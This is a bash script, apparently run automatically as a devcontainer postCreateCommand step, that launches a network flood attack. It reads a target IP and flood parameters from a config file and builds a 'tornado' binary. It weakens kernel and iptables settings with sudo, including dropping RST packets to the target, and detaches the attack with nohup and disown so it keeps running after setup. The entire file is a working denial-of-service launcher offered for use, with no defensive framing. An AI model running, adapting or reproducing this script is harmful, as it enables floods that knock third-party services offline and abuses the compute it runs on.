#!/bin/bash
# run_attack.sh — launch attack detached from shell (postCreateCommand step 2)
# CRITICAL: nohup + disown so attack survives after this script exits

CONFIG="$(pwd)/attack_config.json"

if [ ! -f "$CONFIG" ]; then
    echo "[run_attack] No attack_config.json found — idle."
    exit 0
fi

TARGET=$(python3 -c "import json; d=json.load(open('${CONFIG}')); print(d.get('target_ip',''))" 2>/dev/null)
PORT=$(python3 -c "import json; d=json.load(open('${CONFIG}')); print(d.get('target_port','443'))" 2>/dev/null)
RATE=$(python3 -c "import json; d=json.load(open('${CONFIG}')); print(d.get('rate','1000000000'))" 2>/dev/null)
DURATION=$(python3 -c "import json; d=json.load(open('${CONFIG}')); print(d.get('duration','60'))" 2>/dev/null)
METHOD=$(python3 -c "import json; d=json.load(open('${CONFIG}')); print(d.get('method','v18_tcp'))" 2>/dev/null)
THREADS=$(python3 -c "import json; d=json.load(open('${CONFIG}')); print(d.get('threads','4'))" 2>/dev/null)

if [ -z "$TARGET" ]; then
    echo "[run_attack] No target IP — idle."
    exit 0
fi

if [ ! -f "./tornado" ]; then
    echo "[run_attack] Binary missing, building..."
    make minimal 2>&1 | tail -3
fi

# Network tuning
sudo sysctl -w net.core.wmem_max=67108864       2>/dev/null || true
sudo sysctl -w net.core.rmem_max=67108864       2>/dev/null || true
sudo sysctl -w net.core.netdev_max_backlog=30000 2>/dev/null || true
sudo sysctl -w net.ipv4.conf.all.rp_filter=0    2>/dev/null || true
sudo sysctl -w net.ipv4.ip_forward=1            2>/dev/null || true
sudo iptables -t raw -A OUTPUT -p tcp -j NOTRACK 2>/dev/null || true
sudo iptables -t raw -A OUTPUT -p udp -j NOTRACK 2>/dev/null || true
sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -d "$TARGET" -j DROP 2>/dev/null || true

echo "[run_attack] LAUNCH: $TARGET:$PORT method=$METHOD dur=${DURATION}s threads=$THREADS"

# nohup + disown: detach from shell so process survives after postCreateCommand exits
nohup sudo ./tornado "$TARGET" "$PORT" "$RATE" "$DURATION" "$METHOD" "$THREADS" --no-proxies \
    > /tmp/attack.log 2>&1 &
ATTACK_PID=$!
disown $ATTACK_PID

echo "[run_attack] Attack running in background (PID=$ATTACK_PID)"
echo "[run_attack] Log: /tmp/attack.log"
